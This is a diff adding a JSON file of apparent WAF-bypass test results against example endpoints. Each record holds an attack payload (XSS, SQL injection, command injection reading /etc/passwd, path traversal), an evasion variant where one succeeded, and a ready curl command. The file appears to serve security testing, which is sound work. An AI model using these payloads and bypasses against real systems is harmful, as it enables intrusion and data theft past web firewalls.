@@ -1,0 +1,92 @@
+[
+  {
+    "id": "bb-001",
+    "test_id": "test-xss-bypass-001",
+    "endpoint": "https://app.example.com/search",
+    "method": "GET",
+    "parameter": "q",
+    "original_payload": "<script>alert(1)</script>",
+    "waf_detected": {
+      "type": "cloud_waf",
+      "vendor": "CloudFlare",
+      "confidence": "high"
+    },
+    "successful_bypass": {
+      "found": true,
+      "payload": {
+        "type": "XSS",
+        "value": "<svg/onload=alert(1)>",
+        "encoding": "none"
+      },
+      "minimized_payload": "<svg/onload=alert(1)>"
+    },
+    "mutations_applied": ["tag_substitution", "event_handler_swap"],
+    "curl_command": "curl 'https://app.example.com/search?q=%3Csvg%2Fonload%3Dalert(1)%3E'"
+  },
+  {
+    "id": "bb-002",
+    "test_id": "test-sqli-bypass-001",
+    "endpoint": "https://app.example.com/api/users",
+    "method": "POST",
+    "parameter": "username",
+    "original_payload": "admin' OR 1=1--",
+    "waf_detected": {
+      "type": "cloud_waf",
+      "vendor": "CloudFlare",
+      "confidence": "high"
+    },
+    "successful_bypass": {
+      "found": true,
+      "payload": {
+        "type": "SQLi",
+        "value": "admin'/**/OR/**/1=1--",
+        "encoding": "comment_injection"
+      },
+      "minimized_payload": "admin'/**/OR/**/1=1--"
+    },
+    "mutations_applied": ["comment_injection", "whitespace_substitution"],
+    "curl_command": "curl -X POST 'https://app.example.com/api/users' -d 'username=admin%27%2F**%2FOR%2F**%2F1%3D1--'"
+  },
+  {
+    "id": "bb-003",
+    "test_id": "test-rce-bypass-001",
+    "endpoint": "https://app.example.com/api/exec",
+    "method": "POST",
+    "parameter": "cmd",
+    "original_payload": "; cat /etc/passwd",
+    "waf_detected": {
+      "type": "hardware_waf",
+      "vendor": "F5 BIG-IP",
+      "confidence": "medium"
+    },
+    "successful_bypass": {
+      "found": false
+    },
+    "mutations_applied": ["encoding_variation", "command_substitution", "null_byte_injection"],
+    "curl_command": "curl -X POST 'https://app.example.com/api/exec' -d 'cmd=%3B+cat+%2Fetc%2Fpasswd'"
+  },
+  {
+    "id": "bb-004",
+    "test_id": "test-path-traversal-001",
+    "endpoint": "https://app.example.com/files/download",
+    "method": "GET",
+    "parameter": "path",
+    "original_payload": "../../../etc/passwd",
+    "waf_detected": {
+      "type": "cloud_waf",
+      "vendor": "AWS WAF",
+      "confidence": "high"
+    },
+    "successful_bypass": {
+      "found": true,
+      "payload": {
+        "type": "Path Traversal",
+        "value": "..%252f..%252f..%252fetc%252fpasswd",
+        "encoding": "double_encoding"
+      },
+      "minimized_payload": "..%252f..%252fetc%252fpasswd"
+    },
+    "mutations_applied": ["double_encoding", "unicode_normalization"],
+    "curl_command": "curl 'https://app.example.com/files/download?path=..%252f..%252f..%252fetc%252fpasswd'"
+  }
+]
